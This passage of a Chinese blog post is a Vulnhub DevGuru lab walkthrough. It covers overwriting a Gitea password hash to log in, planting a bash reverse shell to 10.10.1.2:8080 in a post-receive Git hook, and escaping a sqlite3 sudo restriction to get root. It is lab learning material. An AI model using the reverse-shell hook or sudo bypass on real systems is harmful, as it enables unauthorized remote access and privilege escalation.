+<p>这里 gitea 使用的是 <strong>PBKDF2</strong> 哈希算法，想重复之前的方法，覆盖 hash，但生成 hash 一直不成功。索性直接修改 hash 类别，复用之前 bcrypt 的 hash：</p>
+<p><img src="/images/2021-06-23/bcrypt.png" alt="bcrypt"></p>
+<p>使用密码 <strong>haha</strong> 登录 gitea，成功登录：</p>
+<p><img src="/images/2021-06-23/git_login.png" alt="git_login"></p>
+<p>接着就利用原本的项目，对其 Git Hooks 进行修改，写入 bash reverse shell，具体位于 Settings &ndash;&gt; Git Hooks &ndash;&gt; post-receive：</p>
+<p><img src="/images/2021-06-23/proj.png" alt="proj"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
+</span><span class="cp"></span>
+<span class="nb">exec</span> bash -c <span class="s2">&#34;bash -i &gt;/dev/tcp/10.10.1.2/8080 0&gt;&amp;1 2&gt;&amp;1&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="/images/2021-06-23/git_hooks.png" alt="git_hooks"></p>
+<p>随便修改一个项目文件，之后添加、commit 并提交，即可触发 reverse shell：</p>
+<p><img src="/images/2021-06-23/commit.png" alt="commit"></p>
+<p><img src="/images/2021-06-23/frank_rev.png" alt="frank_rev"></p>
+<h2 id="提升为-root">提升为 root</h2>
+<p>查看 frank 用户具有的 sudo 权限，可以以非 root 的其它用户执行 sqlite3，google 之后发现对于用户的限制可以被绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -l
+
+Matching Defaults entries <span class="k">for</span> frank on devguru:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User frank may run the following commands on devguru:
+    <span class="o">(</span>ALL, !root<span class="o">)</span> NOPASSWD: /usr/bin/sqlite3</code></pre></td></tr></table>
+</div>
+</div>
+<p>绕过后在 sqlite 中执行 /bin/sh，获取到 root 权限：</p>
+<p><img src="/images/2021-06-23/root.png" alt="root"></p>
+<h1 id="参考">参考</h1>
+<ol>
+<li><a href="https://www.liam-galvin.co.uk/security/2020/09/26/leaking-git-repos-from-misconfigured-sites.html">Leaking Git Repositories From Misconfigured Sites</a></li>
+<li><a href="https://www.ask-sheldon.com/create-a-bcrypt-hash-on-commandline/">Create a bcrypt hash on commandline</a></li>
+<li><a href="https://octobercms.com/docs/cms/pages">Page Configuration</a></li>
+<li><a href="https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/">Exploiting CVE-2020-14144 - GiTea Authenticated</a></li>
+<li><a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/sqlite3/#sudo">Sqlite3 SUDO</a></li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-06-22
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/vulnhub-tr0ll2/">
+            <span class="next-text nav-default">Vulnhub Tr0ll2</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2020 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
